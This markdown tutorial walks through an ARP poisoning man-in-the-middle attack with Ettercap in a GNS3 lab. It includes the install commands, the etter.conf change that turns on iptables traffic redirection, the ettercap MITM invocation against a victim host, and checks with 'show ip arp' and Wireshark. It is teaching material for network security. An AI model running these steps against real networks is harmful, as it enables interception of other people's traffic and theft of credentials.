# **ARP Poisoning Attack** using **Ettercap**

An **ARP spoofing**, also known as **ARP poisoning**, is a Man in the Middle _**(MitM)**_ attack that allows attackers to intercept communication between network devices.

## ARP Poisoning example with Ettercap
### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp        
* Connect to the **attacker machine**
* Install **ettercap**

        sudo apt update
        sudo apt install ettercap-text-only
* Edit the file `/etc/ettercap/etter.conf`

        sudo pico /etc/ettercap/etter.conf
* Uncomment the following line by removing the `#` at the beginning of the string

  * Before:

        #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
  * After:

        redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
* Execute `ettercap` command in order to scan all the network 
  * `-T:` **select the text only GUI**

        sudo ettercap -T
  * Press `spacebar` to enable/disable packets view
  * Press `l` (lowercase `L`) to show information about discovered devices in the network
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Stop `ettercap` pressing `q` 
* Run (again) `ettercap` in order to start with the **MITM** attack based on ARP Poisoning
  * `-M:` perform a mitm attack. Requires an additional argument useful to specify the **attack type**
  * `<ATTACK_TYPE>:` **ARP**, DHCP, ICMP, etc (see `man ettercap`) 
  * `<VICTIM_TARGET>:` is in the form `MAC/IPs/IPv6/PORTs`. If you want you can omit any of its parts and this will represent an ANY in that part, e.g.,
    
    `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**

        sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>

* Connect again to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp
* The pair `<ip,mac>` related to the ip address of our **Victim** has been changed
* Connect to another **ubuntu host machine** (ubuntu-2, for example) and run the following command

        ping <Victim_IP_ADDRESS>
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests
  